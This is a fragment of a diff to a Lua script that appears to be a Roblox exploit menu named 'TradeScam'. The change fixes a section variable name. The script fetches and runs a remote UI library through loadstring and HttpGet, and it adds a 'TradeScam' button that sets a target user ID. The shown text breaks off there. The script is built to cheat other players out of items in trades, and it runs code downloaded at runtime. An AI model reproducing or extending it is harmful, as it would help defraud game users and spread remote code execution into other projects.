@@ -2,7 +2,7 @@ local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHept
 local Window = Library.CreateLib("(TSD_DOGE) TradeScam CURRENT STATUS: OWNER", "Midnight")
 
 local TradeScam = Window:NewTab("TradeScam")
-local TradeScamSection = FORCETRADE:NewSection("TradeScam")
+local TradeScamSection = TradeScam:NewSection("TradeScam")
 
 TradeScamSection:NewButton("TradeScam", "TradeScam!!", function()
 _G.UserID = 1516599524;
